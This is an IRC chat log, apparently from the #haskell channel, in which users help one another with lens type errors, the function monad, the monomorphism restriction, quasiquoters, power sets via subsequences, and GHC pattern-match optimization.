17:09:09 <augur> Bor0: you should take their advice tho. learn haskell first.
17:09:22 <augur> monochrom: are they? i would argue they're semi-tangential
17:09:29 <monochrom> after you grok case-of and those foldr-like functions, you're ready for church encoding
17:10:08 <Bor0> well, lambda calculus is fun to me. I'm just sticking to fun things. I was going to start haskell just after a little bit of lambda, but I can't get enough of lambda yet
17:10:14 <augur> the ADTs are maybe more basic if you take a proof-theoretic perspective
17:10:26 <Cale> augur: Church encodings are encodings of values of algebraic data types
17:10:30 <hpaste> fizruk pasted ‚ÄúLens strange type error‚Äù at http://hpaste.org/87544
17:10:49 <augur> monochrom: as it happens, i have two tutorials, on church encoding and one on scott encoding :)
17:11:03 <augur> Cale: eh. church encodings are just pre-compiled recursion principles
17:11:40 <Cale> If you have a data type with constructors C_1, ... C_n, and some value built up from those constructors, you encode it by some lambda of the form (\C_1 C_2 ... C_n -> ...)
17:11:57 <augur> Cale: i know how it works.
17:12:01 <fizruk> How can I eliminate that type error? http://hpaste.org/87544
17:12:18 <Cale> But it *really* helps to know about algebraic data types first :)
17:12:32 <augur> Cale: honestly i think it probably helps more to know the type theory first :)
17:13:21 <Cale> Yeah, you kind of need to know some type theory in order to write programs in untyped lambda calculus without everything becoming horrible :)
17:13:37 <augur> Cale: from the types/proofs you get the ADTs from syntax, and the Scott and Church encodings by pre-elimination of detours
17:14:17 <hpc> augur: haskell: the low calorie type-theory substitute!
17:14:23 <hpc> you can't taste the difference
17:14:38 <augur> i dont even know what thats supposed to mean :P
17:14:51 <monochrom> does type theory make me obese?
17:17:11 <edwardk> fizruk: i recommend using the supplied lens once.
17:17:16 <lispy> does this typing context make me look fat?
17:17:29 <edwardk> fizruk: which means thinking about what a lens means a bit more
17:18:22 <edwardk> what you want to do is grab the current root, go swap that value into the target val of the target lens getting back its current contents, and then go put it back into the root
17:18:27 <hpc> be careful, excessive consumption of lenses will go straight to your type signature
17:18:45 <edwardk> @remember hpc be careful, excessive consumption of lenses will go straight to your type signature
17:18:46 <lambdabot> Nice!
17:19:30 <fizruk> edwardk: so how should I rewrite my code? don't get it yet
17:19:52 <edwardk> we can do that in one of several ways. perhaps the easiest would be just zoom in at the right moment and then do the read and write.
17:19:55 <edwardk> lets see
17:21:29 <fizruk> edwardk: ok, I got that. but I'm going to use fromJust anyway, right?
17:21:34 <edwardk> swap l = do a <- val; c <- zoom l $ do { b <- use val; val .= a; return b }; val .= c
17:22:07 <edwardk> oh you wanted that to be a traversal you assumed was non-empty?
17:22:17 <edwardk> swap l = do a <- val; c <- zoom (singular l) $ do { b <- use val; val .= a; return b }; val .= c
17:23:05 <edwardk> here we only use the user lens once, as l.
17:23:06 <fizruk> edwardk: is singular just generalization of fromJust?
17:23:22 <edwardk> in your code you wind up having to use node_ twice
17:23:57 <fizruk> edwardk: ok, but how does that lead to the type error?
17:24:09 <edwardk> i haven't seen the type error. let me look )
17:24:32 <edwardk> do you have that pasted?
17:24:56 <fizruk> see the line -- XXX: this line fails to compile
17:25:38 <edwardk> can you paste the actual error?
17:26:03 <edwardk> :t (<~)
17:26:05 <lambdabot> MonadState s m => ASetter s s a b -> m b -> m ()
17:27:50 <hpaste> fizruk pasted ‚Äútype error‚Äù at http://hpaste.org/87546
17:27:59 <fizruk> type error itself is here http://hpaste.org/87546
17:29:10 <fizruk> edwardk: error remains after rewriting swap
17:31:05 <edwardk> the issue is that let node_ = if (r > l) then right_ else left_     doesn't give you a polymorphic function
17:31:32 <edwardk> let doesn't generalize
17:31:51 <acowley> I have naming paralysis
17:31:53 <edwardk> a signature on that node_ :: declaration would work, also you can encode that a bit differently
17:32:04 <acowley> How do I get pandoc to give me some syntax highlit html from a .hs file?
17:32:21 <acowley> It deals with .lhs without any special encouragement
17:32:30 <edwardk> example:             when (m > v) $ do
17:32:30 <edwardk>                 swap (if (r > l) then right_ else left_)
17:32:32 <edwardk>                 zoom (if (r > l) then right_ else left_) test'
17:32:33 <edwardk> that works
17:32:57 <fizruk> edwardk: I thought so, yet what declaration should I use?
17:33:26 <acowley> edwardk: I need to name a function that's basically a fold, but the function comes from a typeclass
17:33:28 <fizruk> edwardk: yes, replacing node with if expression for swap only suffices
17:33:42 <acowley> edwardk: I currently call this thing jumanji, but I don't know that that's a great name
17:34:16 <edwardk> fizruk: you can also fix this by weakening the signature on swap to take just what is needed for zoom
17:34:41 <edwardk> acowley: does it turn you into Robin Williams?
17:35:05 <acowley> edwardk: If you give it the right return type
17:35:26 <acowley> I think it's really neat code, but I may be missing a lens operator that already does this
17:35:38 <edwardk> whats it do
17:35:40 <hpc> unsafePerformCrappyComedy
17:35:53 <fizruk> edwardk: but I also use singular
17:36:55 <P1RATEZ> is this the only functional language that can be compiled to executable, is there a visual ide to draw form items for it?
17:37:27 <acowley> edwardk: http://www.seas.upenn.edu/~acowley/VinylStateExamples.html
17:37:43 <dolio> No.
17:37:51 <acowley> edwardk: Uses of jumanji are at the end
17:38:15 <Hafydd> P1RATEZ: even if by "executable" you mean "
17:38:24 <Hafydd> native binary", the answer is "no."
17:38:32 <edwardk> acowley: where is the definition of jumanji given?
17:38:43 <hpaste> acowley pasted ‚Äújumanji‚Äù at http://hpaste.org/87547
17:38:49 <acowley> There
17:39:16 <acowley> I actually have several naming problems
17:39:17 <edwardk> i see two use sites and a reference to it above it
17:39:22 <edwardk> but no definition
17:39:28 <acowley> Oh sorry, I meant the hpaste
17:39:36 <edwardk> ahhh
17:39:56 <monochrom> yin and yang? :)
17:40:04 <acowley> So the idea is this
17:40:10 <acowley> it ends by producing a record from some value
17:40:27 <acowley> and that mechanism is used to also decide how the inputs are used to update intermediate state
17:40:32 <acowley> yang is driven by yin
17:40:58 * BMeph wonders what the mascot of Vinyl State is... ;√æ
17:41:03 <edwardk> RecStater?
17:41:26 <hpaste> acowley pasted ‚ÄúVinylState‚Äù at http://hpaste.org/87548
17:41:31 <acowley> That hpaste has all the code
17:42:04 <acowley> The names are terrible because it took me so long to figure out what I was trying to do, so I had to just build it out from the types I wanted.
17:42:09 * BMeph imagines it's whatever beast nougahyde would come from. ;)
17:42:59 <edwardk> Rec is the vinyl hlist?
17:43:00 <blaenk> hey I'm trying to figure out how to use regular expressions in haskell. the interface is defined in regex-base correct? cause I have regex-tdfa installed but it seems like that's just a backend?
17:43:05 <acowley> edwardk: Yeah
17:43:07 <edwardk> k
17:44:02 <acowley> My use case is that I have a file format the parsing of which is rather a lot of work, and quite often much of the data won't be needed by the caller
17:44:16 <edwardk> why the two parts to the recState result?
17:44:25 <acowley> So what I dreamed about having was something that would parse differently depending on how many fields were in the ultimate result record type
17:44:42 <acowley> edwardk: One goes from input to intermediate state, the other goes from intermediate state to output
17:44:50 <edwardk> k
17:45:19 <acowley> I suspect I haven't yet hit what I need for my parsing problem, actually. But I'm at least close.
17:46:38 <edwardk> yeah i've got nothing in lens for this because we don't have type-indexed lenses/traversals.
17:47:44 <edwardk> given Rec you can always just recurse down it yourself though, so i'm not sure i see why this is hard
17:49:57 <acowley> Well I don't know how to argue "hard", but the upside is that I don't need to support different combinations of fields in the library, and the client code just needs to change the type signature to get different results and performance.
17:50:36 <acowley> The recursion is of course still there in the instances.
17:54:01 <edwardk> fair nuff
17:54:06 <acowley> Hmm‚Ä¶ could rename it to pocahontas and keep the 1995 theme.
17:57:41 <fizbin> @pl  \f -> sqrt (f :: Double)
17:57:41 <lambdabot> sqrt . (:: Double)
17:57:57 <latro`a> ...the hell?
17:57:59 <fizbin> > (sqrt . (:: Double)) 5.0
17:58:01 <lambdabot>   <hint>:1:10: parse error on input `::'
17:58:06 <latro`a> wat
17:58:08 <fizbin> Yeah, I didn't think so.
17:58:24 <fizbin> Sometimes, @pl is a bit drunk
17:58:30 <latro`a> seems like it
18:01:51 <geekosaur> @pl doesn't actually know haskell, and thinks :: is an operator and Double is a data constructor
18:01:51 <lambdabot> (line 1, column 30):
18:01:51 <lambdabot> unexpected ','
18:01:51 <lambdabot> expecting variable, "(", operator or end of input
18:02:05 <geekosaur> c/i/p
18:04:50 <blaenk> anyone familiar with regex-tdfa? trying to figure out how to make it operate in multiline mode
18:05:21 <blaenk> found data CompOption with a multiline constructor but I have no idea how to use it, will keep looking I suppose
18:14:41 <edwardk> p
18:20:18 <acowley> hackage seems sort of down
18:22:25 <fxr> acowley: not for me
18:22:42 <acowley> I guess my ISP is special
19:19:35 <sbwhitecap> cabal-install does not support http proxy?
19:24:26 <jamil_1> sbwhitecap: it does
19:24:45 <jamil_1> export http_proxy=http://localhost:port
19:25:40 <sbwhitecap> I set http_proxy but bootstrap.sh failed
19:28:46 <lurbina> I'm somewhat new to haskell and I'm confused as to what this function actually does
19:28:56 <lurbina> (==) =<<
19:29:36 <lurbina> the type signature is (Eq a, Monad ((->) a)) => (a -> a) -> a -> Bool
19:29:43 <sbwhitecap> jamil_1: Thanks for your clarification.
19:29:46 <lurbina> but I cannot really grasp intuitively what it actually does
19:30:25 <lurbina> I'm just confused as I saw this code being used to check for palindromes as follows
19:30:37 <lurbina> isPalindrome = (==) =<< reverse
19:30:55 <lurbina> and I can't wrap my head around of how that works...
19:30:55 <Cale> lurbina: This is the instance of Monad for functions
19:30:58 <sipa> > ((==) =<<) (+1) 0
19:31:01 <lambdabot>   False
19:31:03 <sipa> > ((==) =<<) (+1) 1
19:31:05 <lambdabot>   False
19:31:16 <Cale> lurbina: (f =<< x) e = f e (x e)
19:31:26 <Cale> (pretty much by definition)
19:31:27 <sipa> > ((==) =<<) (+0) 1
19:31:30 <lambdabot>   True
19:31:45 <Cale> er, sorry, wrong way
19:31:50 <Cale> lurbina: (f =<< x) e = f (x e) e
19:32:02 <lurbina> ok
19:32:07 <lurbina> I think I get it now
19:32:14 <lurbina> that make sense
19:32:17 <lurbina> thanks!
19:32:30 <Cale> lurbina: If you're familiar with monads in general, then the main thing you need to know is that "running" a function in this monad means applying it to the parameter to which the whole function has been applied
19:32:40 <Cale> So, as another example:
19:32:52 <lurbina> I am familiar with monads
19:32:54 <Cale> > (do x <- id; y <- reverse; z <- map toUpper; return (x,y,z)) "hello"
19:32:57 <lambdabot>   ("hello","olleh","HELLO")
19:33:17 <Cale> > sequence [id, (+2), (*2), (^2), (2^)] 5
19:33:19 <lambdabot>   [5,7,10,25,32]
19:34:07 <lurbina> (when you refer to *this* monad you are talking about the partially applied function monad, right?)
19:34:24 <Cale> Yeah
19:34:28 <lurbina> cool
19:34:37 <lurbina> thanks
19:34:38 <Cale> Or just the function monad, or the "reader monad"
19:34:52 <lurbina> ok
19:34:58 <lurbina> :-)
19:34:59 <Cale> (It's the unwrapped version of the Reader monad in the library)
19:34:59 <lurbina> thanks
19:35:39 <lurbina> (at the moment the reference to why the Reader monad is the same as this is not evidently clear to me, but don't worry I think I just need a few minutes to wrap the idea around my head)
19:35:45 <lurbina> thanks for the prompt answer
19:43:37 <sbwhitecap> cabal-install unsuccessfully tried to resolve dependencies
19:44:35 <sbwhitecap> when configuring Cabal-1.14.0
19:44:42 <jamil_1> (f =<< x) e = f (x e) e
19:44:55 <jamil_1> is this related to S combinator ?
19:45:41 <lurbina> > ((==) =<<) (+1) 0
19:45:43 <lambdabot>   False
19:46:32 <jamil_1> sbwhitecap: why not use haskell-platform ?
19:47:11 <byorgey> jamil_1: it IS the S combinator, up to reordering of arguments.
19:47:13 <sbwhitecap> ok, i'll try it
19:50:00 <lurbina> ok I was very confused for a little while as I was not importing Control.Monad.Instances so the (Monad ((->) a) was not defined causing stuff to break...
19:50:57 <lurbina> dug
19:50:58 <lurbina> duh
19:56:03 <sbwhitecap> when haskell-platform 2013.2.0.0 will be released?
19:57:11 <zachk> not soon enough!
19:57:58 <chairs> so I was messing around with that example in ghci, ":t reverse >>= (==)" gives Eq a => [a] -> Bool as expected, but when I bind that same function to a name, it's type is [()] -> Bool. Can someone explain this to me?
19:58:42 <T_S_> Has anybody run across haskell bindings to the tesseract ocr library?
19:58:53 <zachk> ?
19:59:07 <copumpkin> chairs: monomorphism restriction
19:59:46 <copumpkin> passing ghci -XNoMonomorphismRestriction should fix it
19:59:53 <copumpkin> or :set that option
20:00:37 <chairs> copumpkin: yeah, looking at the haskellwiki page right now. Weird.
20:01:34 <copumpkin> it's somewhat controversial
20:01:54 <copumpkin> but it also makes some sense
20:03:13 <lurbina> just looked at it...
20:03:18 <lurbina> that's pretty weird
20:03:30 <lurbina> anyway
20:03:32 <lurbina> thanks everyone
20:03:34 <lurbina> I'm heading out
20:19:55 <chrisdotcode> hey guys, is it just me, or is hackage really slow right now?
20:21:49 <lispy> hmm
20:21:51 <lispy> I'll try
20:22:14 <lispy> chrisdotcode: the website is responsive for me
20:22:31 <lispy> chrisdotcode: 'cabal update' is always slow, fwiw
20:22:42 <lispy> chrisdotcode: anything in particular that is slow?
20:22:45 <chrisdotcode> lispy: hackage.haskell.org/package/gloss
20:23:05 <lispy> loads almost instantly for me
20:23:31 <chrisdotcode> lispy: odd. usually youtube is terribly slow for me, but everything else fast.
20:23:33 <chrisdotcode> not this time...
20:24:13 * lispy improves the OpenCL support in language-c-quote
20:25:25 <lispy> I've decided (time permitting) that I would start porting parts of my ray-tracer to opencl. See if I can get some real-time framerates out of it.
20:25:53 <chrisdotcode> lispy: okay, I think it was just firefox leaking memory...
20:25:59 <chrisdotcode> I'm gonna restart it and try again...
20:26:11 <lispy> chrisdotcode: good luck!
20:26:17 <chrisdotcode> :)
20:26:23 <chrisdotcode> hi, apaku
20:26:25 <chrisdotcode> * applicative
20:26:35 <chrisdotcode> (also hi apaku)
20:26:52 <applicative> ah hi chrisdotcode
20:26:53 <cmccann> nick autocomplete is a dangerous game in this channel.
20:27:12 <applicative> dunno cmccann works awfully well
20:27:18 <Shaladdle> lispy: is your raytracer in haskell?
20:27:23 <lispy> Shaladdle: yes
20:27:39 <Shaladdle> lispy: that's cool :) I am writing a parallel raytracer for a project as we speak
20:27:41 <lispy> https://github.com/dagit/haray
20:27:43 <Shaladdle> lispy: not in haskell though :(
20:28:02 <lispy> Shaladdle: I added oculus rift support last month
20:28:16 <Shaladdle> lispy: whoa that's pretty awesome
20:28:27 <lispy> Not the device querying part, but it does the output for each eye
20:28:51 <lispy> If I can get real-time framerates I'll take the time to add device support
20:29:38 <Shaladdle> if I cabal install it what kind of stuff can I ray trace?
20:29:59 <lispy> Shaladdle: run the script, run-examples.hs
20:30:05 <applicative> well, has Mr J. Carmack shown up looking for help yet; I'm totally gonna 'splain monads to him.
20:30:08 <Shaladdle> lispy: cool
20:30:15 <Shaladdle> lispy: how are you planning to parallelize it?
20:30:16 <lispy> Shaladdle: https://github.com/dagit/haray/tree/master/scenes
20:30:51 <lispy> Shaladdle: at the moment, you ran run it with +RTS -N2 and it will render each eye in a separate thread (that only happens for 1-2 of the example scenes)
20:30:59 <lispy> can run*
20:31:12 <lpvb> anyone have good introductory reading material for arrows
20:31:30 <lispy> Shaladdle: I use the async package to render the cameras concurrently, but to be honest I'm not sure how to both support random sample and parallelism nicely.
20:31:43 <lpvb> I think I have a little intuition on how to use them but not how to define my own arrows
20:31:46 <lpvb> or use cases
20:32:12 <lispy> Shaladdle: http://stackoverflow.com/questions/16248600/parallel-computations-with-fast-randomness-and-purity
20:32:27 <cmccann> there are only like three kinds of arrows anyone cares about, I wouldn't worry about defining your own :P
20:32:31 <lispy> Shaladdle: part of my plan to parallelize it is to switch to the gpu :)
20:33:07 <lpvb> :\
20:33:20 <lispy> Shaladdle: the phases of that are: write the opencl by hand at first and then once I understand how the code should look/work I'll start to play around with DSLs for generating opencl
20:33:45 <lispy> Shaladdle: There is already lots of Haskell work in that area so I should be able to bootstrap from those efforts
20:33:46 <Shaladdle> lispy: Nice! We are focusing on packetizing using intel vector SIMD, and maybe later try doing GPU
20:34:23 <Shaladdle> lispy: Is there not really haskell support for OpenCL yet?
20:34:33 <lispy> there is!
20:35:16 <applicative> lpvb: mm freak has a tutorial.  http://ertes.de/new/tutorials/arrows.html  I haven't read it though.
20:35:49 <lpvb> that one was kind of hard to grasp
20:35:57 <lispy> language-c-quote can parse and show OpenCL (so you can use quasiquotes to get a sort of opencl macro system/meta language going) and there is an OpenCL library that does all the talking to hardware and compiling your opencl code. And there are a couple packages that provide high level ways to work with the gpu like Repa and Tesla)
20:36:01 <lpvb> I think it needs some diagrams
20:36:35 <Shaladdle> lispy: Do you mean nVidia Tesla? Or is that just something I haven't heard of? Don't know what Repa is
20:36:58 <lispy> Shaladdle: er I mispoke, I meant Nikola actually: http://www.eecs.harvard.edu/~mainland/publications/mainland10nikola.pdf
20:37:24 <lispy> Shaladdle: repa is an array library that provides data parallelism automagically
20:37:38 <lispy> Shaladdle: http://www.youtube.com/watch?v=jBd9c1gAqWs
20:39:09 <Shaladdle> lispy: Lots of stuff to look into now haha!
20:39:37 <applicative> lpvb: there are pleasant circuit diagrams somewhere.  These leave something to be desired http://en.wikibooks.org/wiki/Haskell/Understanding_arrows
20:41:04 <Shaladdle> mrp
20:41:14 <Shaladdle> Oh thought irssi was messed up..
20:41:28 <voxpopuli> lispy: is there a good library for SIMD use in Haskell?
20:41:56 <lispy> voxpopuli: you need ghc 7.8 (not out yet) and the vector package: http://research.microsoft.com/en-us/um/people/simonpj/papers/ndp/haskell-beats-C.pdf
20:42:24 * lispy is not a fan of that paper's title
20:43:14 <voxpopuli> haven't *quite* gotten around to reading that one...
20:43:22 <applicative> the 'beats C' part or the 'generalized stream fusion" part?
20:43:37 <lispy> voxpopuli: I think it's still under peer review, but it's worth reading.
20:44:25 <applicative> is the version of the vector library they are talking about available somewhere?
20:45:18 * applicative notes that one of the authors they cite is a computer scientist name Prof. K Goto
20:46:43 <lispy> applicative: I couldn't tell from the paper which version of vector was used for the paper, but the git repo might have the answer in the log...
20:47:06 <lispy> oh, it's darcs
20:47:07 <lispy> http://code.haskell.org/vector/
20:47:40 <applicative> lispy it has some of the features they were talking about.  But it hasn't been updated in ages
20:48:13 <applicative> yeah its on github too
20:49:59 <lispy> applicative: re: paper title, it seems a bit inflammatory (at worst) and at best naive. For example, I think they only compared against gcc's C and only for some specific programs. So saying it beats all of C is a bit too much. Does it beat good optimizing compilers like intel's?
20:50:52 <applicative> yes
20:51:04 <lispy> the results are impressive, hence my complaint is mostly with the title :)
20:53:43 <applicative> I was thinking 'generalized stream fusion' might be replaced with 'brilliant new hack to add on to stream fusion'... but I dunno
20:55:52 * hackagebot HLearn-algebra 1.0.0 - Algebraic foundation for homomorphic learning  http://hackage.haskell.org/package/HLearn-algebra-1.0.0 (MikeIzbicki)
20:55:54 * hackagebot HLearn-distributions 1.0.0 - Distributions for use with the HLearn library  http://hackage.haskell.org/package/HLearn-distributions-1.0.0 (MikeIzbicki)
20:56:33 <applicative> lispy it's hard to imagine spj writing e.g. "In other words, GHC is such a fantastic partial evaluator that we were able to build generalized stream fusion as a library rather than incorporating it into the compiler itself." etc
20:57:19 <applicative> ... compilers less capable than GHC ..., not the best taste
21:01:20 <lispy> hmm
21:01:23 <lispy> right :)
21:05:40 <hpaste> ‚ÄúAnonymous Coward‚Äù annotated ‚ÄúGADTs‚Äù with ‚ÄúGADTs (annotation) (annotation)‚Äù at http://hpaste.org/86445#a87555
21:26:48 <slack1256> is there any language with default lenient evaluation?
21:27:39 <sclv> @remember acowley The longer I leave this function named "jumanji" the less I want to find a better name
21:27:39 <lambdabot> Good to know.
21:48:49 <Cale> slack1256: No language implementations as far as I'm aware, but it's a valid way to implement Haskell.
22:02:35 <johnw> hi Cale!
22:03:22 <Cale> hi
22:09:42 <slack1256> Mmm because the new of Carmack implementing wolf3d on haskell, there were circulating a .ppt arguing for a lenient evaluated language for develoment
22:10:08 <slack1256> my first thought was "with what where they playing to get that conclusion!"
22:10:22 <dankGnu> clear
22:11:26 <lispy> with the quasiquoter is there a way to expand something of type [Char]?
22:11:39 <lispy> [foo|$blah|], where blah = "Hello"
22:12:03 <lispy> Something like that, where [foo|$blah|] would then get expanded to [foo|Hello|] so that foo can parse it?
22:12:12 <lispy> I think this is related to antiquotation
22:13:06 <aavogt> lispy: it sounds like you'll run into stage restrictions trying to get that to happen
22:13:40 <aavogt> since the blah could actually be defined at runtime (say reading console input)
22:13:44 <lispy> Then what is the correct way to construct the thing between the brackets?
22:13:51 <aavogt> but the quasiquote is run at compile time
22:14:55 <aavogt> you can use   dyn "foo"  to get the ExpQ that would evaluate to the foo in scope there
22:16:34 <aavogt> lispy: you could do      foo = QuasiQuoter { quoteExp = \s -> [| someFunction $(dyn s) |] }
22:17:09 <aavogt> which might be close enough to what you're after
22:20:07 <lispy> aavogt: I think what I want to do works: http://benedictgaster.org/wp-content/uploads/2013/01/embedding.pdf
22:20:13 <lispy> aavogt: I just can't figure out the syntax :(
22:20:44 <lispy> search for hwstr
22:21:03 <lispy> they define hwstr as a haskell String and then mix it into a quasiquoter by putting $hwstr
22:22:16 <aavogt> lispy: the Q Exp that's generated doesn't depend on the value hwstr actually takes
22:22:50 <aavogt> which is exactly what I suggested with dyn
22:25:16 <WhoNeedszzz> hey guys
22:25:29 <WhoNeedszzz> what's the easiest way to implement the power set generation problem?  For example, an input of ìa b cî would generate the list:  {}, {a}, {b}, {c}, {a,b}, {a,c}, {b,c}, {a,b,c}.
22:25:54 <WhoNeedszzz> seems like something i could do easily with a list comprehension, yes?
22:26:29 <shachaf> No.
22:26:37 <lispy> aavogt: I couldn't get the dyn thing to parse
22:26:38 <shachaf> List comprehensions are overrated anyway.
22:26:43 <WhoNeedszzz> heh ok
22:26:51 <WhoNeedszzz> so what would you recommend?
22:26:51 <shachaf> You could do it with a list function, though.
22:27:08 <shachaf> What do you do with the input "a a b c"?
22:27:17 <WhoNeedszzz> same thing
22:27:20 <WhoNeedszzz> it's sets
22:27:30 <shachaf> Data.List.subsequences is something.
22:27:40 <shachaf> Also you should split this problem up.
22:27:40 <WhoNeedszzz> sounds about right
22:27:54 <shachaf> Instead of a string input you should take a list or set or something.
22:28:05 <shachaf> Then you can ask about just the relevant function!
22:28:09 <WhoNeedszzz> sorry i didn't mean a string
22:28:12 <WhoNeedszzz> it is a list as input
22:28:27 <WhoNeedszzz> what relevant function?
22:28:39 <WhoNeedszzz> Data.List has a function for this already?
22:29:01 <WhoNeedszzz> a set as input would be actually easier
22:29:07 <shachaf> 22:27 <shachaf> Data.List.subsequences is something.
22:29:27 <WhoNeedszzz> Is there a simple way of having a helper function that takes a list as input and output the set?
22:30:21 <WhoNeedszzz> oh yeah lol that does do exactly what i want
22:30:23 <WhoNeedszzz> go figure
22:30:32 <Cale> You can use list comprehensions as part of a recursive solution to the problem
22:30:33 <WhoNeedszzz> wonder if java has a built-in function like that too
22:30:39 <WhoNeedszzz> (i'm comparing the two in a CS paper)
22:31:10 <WhoNeedszzz> Cale, i figured you could, but like i said that function does do exactly what i want
22:31:18 <Cale> Note that if the input list is (x:xs) then every list in the output is either a subsequence of xs alone, or it starts with x and is followed by a subsequence of xs
22:32:02 <SingingBoyo> to create a set from a List in java?  I think that's just new Set(yourList);  Could be wrong though, haven't used java for a long time.
22:32:03 <WhoNeedszzz> not sure what you mean
22:32:26 <WhoNeedszzz> Cale that is
22:32:47 <Cale> SingingBoyo: To find all subsequences of a list
22:33:00 <WhoNeedszzz> i kinda feel like java has a function like this
22:33:06 <WhoNeedszzz> method rather
22:33:42 <SingingBoyo> Ah.  Hmm well then what I suggested wouldn't work at all.
22:35:49 <Cale> WhoNeedszzz: There is exactly one subsequence of the list [], which is [] itself, so  subsequences [] = [[]]
22:36:14 <Cale> WhoNeedszzz: and given subsequences xs, we can construct subsequences (x:xs)
22:36:41 <WhoNeedszzz> which is what i was getting at
22:36:54 <Cale> because every subsequence of (x:xs) will either just be a subsequence of xs (that is, without x in it), or it will have x in it, followed by a subsequence of xs
22:36:55 <WhoNeedszzz> but, like i said, is irrelevant since i can just use that built-in
22:37:29 <Cale> so  subsequences (x:xs) = subsequences xs ++ map (x:) (subsequences xs)
22:41:07 <dEPy> good mornin' !
22:41:21 <WhoNeedszzz> yep there is a .powerSet() method in guava
22:41:29 <WhoNeedszzz> so i can just import guava
22:41:30 <WhoNeedszzz> hehe
22:49:38 <zRecursive> @ty (&&&)
22:49:40 <lambdabot> Arrow a => a b c -> a b c' -> a b (c, c')
22:50:08 <johnw> (f &&& g) x = (f x, g x)
22:51:12 <lispy> aavogt: I think the problem is that whoever designed these quasiquoters didn't add antiquotation support to all of them
22:51:46 <lispy> aavogt: the syntax I want to use works with [cexp| ... |] but not with [cty| ... |]
22:51:55 <johnw> i believe that (&&&) = liftM2 (,)
22:52:20 <johnw> (well, not the Arrow-y definition)
22:53:20 <WhoNeedszzz> ok well thanks for the help guys
22:54:14 <NemesisD> does hoogle not support searching packages?
22:54:26 <Clint> you have to list them explicitly
22:54:43 <NemesisD> whats the syntax for that?
22:55:29 <zRecursive> @src (&&&)
22:55:29 <lambdabot> f &&& g = arr (\b -> (b,b)) >>> f *** g
22:56:02 <johnw> :t liftM2 (,)
22:56:04 <lambdabot> Monad m => m a1 -> m a2 -> m (a1, a2)
22:56:15 <johnw> where m = Arrow a => a b
22:56:24 <johnw> but I think the liftM2 version is more restrictive
22:59:22 <zRecursive> At least liftM2 (,) /= (&&&)
23:00:28 <johnw> yeah, for functions they are isomorphic, but the type constraints are quite different
23:00:57 <zRecursive> sure
23:01:39 <shachaf> They are isomorphic -- in particular they are equal.
23:01:59 <johnw> how are they equal?
23:02:06 <shachaf> They are the same function.
23:02:12 <shachaf> (At those instances.)
23:02:14 <Breadmonster> Can I use literals in pattern matching?
23:02:16 <zRecursive> arrow is not monad, right ?
23:02:18 <johnw> ah, yes
23:02:39 <Breadmonster> Like case xs of 1:x:[] = x + 1; otherwise = 4;
23:02:40 <Breadmonster> ?
23:02:59 <shachaf> Breadmonster: Did you try it? :-)
23:03:20 <Breadmonster> shachaf: No...
23:03:37 <Breadmonster> Alright, fine.
23:03:39 <Breadmonster> One more thing.
23:03:48 <Breadmonster> ...does GHC do optimizations on cases?
23:03:52 <NemesisD> hmm. does hoogle only index some subset of hackage packages
23:04:19 <Breadmonster> So, for instance, if I put one case first, and some other case later, will it retain that order in the final code?
23:04:41 <shachaf> What does that mean?
23:04:43 <zRecursive> pass through ?
23:05:13 <Breadmonster> isWhite c     | c == ' '  = True     | c == '\n' = True     | c == '\t' = True     | otherwise = False
23:05:28 <chrisdotcode> Breadmonster: did the 1:x:[] pattern match work?
23:05:32 * chrisdotcode is curious
23:05:33 <Breadmonster> ...yes,
23:05:40 <chrisdotcode> awesome
23:06:08 <Breadmonster> shachaf: In that bit of code, I can expect ' ' to come up more frequently than '\n'
23:06:17 <Breadmonster> So I put the ' ' case first.
23:06:26 <Breadmonster> Will the compiler retain this order?
23:07:51 <shachaf> Breadmonster: That question is about guards, not case patterns.
23:08:12 <Breadmonster> shachaf: I could do it as a case pattern too, but fine.
23:08:17 <shachaf> Guards are a completely different story.
23:08:22 <Breadmonster> Really?
23:08:32 <Breadmonster> Aren't they syntactic sugar for case?
23:08:42 <shachaf> For case on a boolean, yes.
23:08:47 <shachaf> You could have an arbitrary function there.
23:09:02 <shachaf> In order to reorder those guards, GHC has to prove that it can never be the case that c == ' ' and also c == '\n'
23:09:11 <Breadmonster> Alright.
23:09:35 <Breadmonster> shachaf: What about case patterns?
23:09:43 <shachaf> With proper pattern matches, I think you can expect it to mostly ignore your order.
23:09:50 <shachaf> But I don't know.
23:10:17 <shachaf> "does it optimize it?" is a vague question.
23:10:26 <Breadmonster> So ordering pattern matches for performance might be useless?
23:10:42 <sclv> there's some funny cutoff. like it does jump tables with proper pattern matches below a certain amount if i recall.
23:11:12 <chrisdotcode> guys, where's haskell's modulus?
23:11:16 <shachaf> It's always useful to order pattern matches for performance. The question is whether it's possible. :-)
23:11:22 <simpson> :t mod
23:11:25 <lambdabot> Integral a => a -> a -> a
23:11:27 <sclv> nonetheless, better to order for performance just to be safe
23:11:34 <simpson> > 4 `mod` 3
23:11:37 <chrisdotcode> oy, it's called mod
23:11:40 <lambdabot>   mueval: ExitFailure 1
23:11:40 <lambdabot>  mueval: Prelude.undefined
23:11:41 <chrisdotcode> simpson: thanks :)
23:11:43 <sclv> recognizing that you might get something even better than fallthroughs anyway
23:11:51 <shachaf> I wish GHC generated LLVM code that was compatible with this: https://gist.github.com/kmcallister/4211534
23:11:56 <sclv> wtf mueval!
23:12:02 <sclv> > 1 + 1
23:12:05 <lambdabot>   2
23:12:09 <shachaf> Unfortunately it generates a chain of ifs instead of a switch, and the LLVM optimizer doesn't recognize it.
23:13:18 <Breadmonster> shachaf: The problem is that ordering pattern matches results in uglier code.
23:13:29 <Breadmonster> At least by my subjective standards of beauty.
23:14:03 <shachaf> Breadmonster: Write non-ugly code first and optimize it later if necessary.
23:14:19 <shachaf> In the old days GHC did vectored-returns for small sums, which made "order" pretty much irrelevant.
23:14:35 <shachaf> But vectored-returns is a bad tradeoff nowadays. :-(
23:14:43 <Breadmonster> shachaf: The optimization would not be worth the rewrite.
23:15:00 <shachaf> Then it is not worth the write.
23:15:14 <sclv> actually i think order matters with chars
23:15:32 <sclv> its not the number of cases that determines if you use a jump table, but the number of _constructors_
23:15:37 <sclv> iirc
23:15:42 <Breadmonster> shachaf: And does GHC do TCO on mutually recursive functions?
23:16:11 <shachaf> Breadmonster: The concept of TCO doesn't make sense for GHC. There is no optimization and there is no need for it.
23:16:30 <Breadmonster> How so?
23:17:08 <shachaf> sclv: This would be the point where I'd look at the generated code, if I cared enough.
23:17:15 <sclv> yep
23:17:19 <atamagawarui> Breadmonster: TCO mostly makes sense for strict evaluation.
23:17:35 <sclv> i remember some cases of cuet benchmarks where switching the match order for chars made a difference
23:17:37 <shachaf> Breadmonster: Lazy evaluation doesn't work the way you might think.
23:19:23 <shachaf> Breadmonster: You should read some things about it.
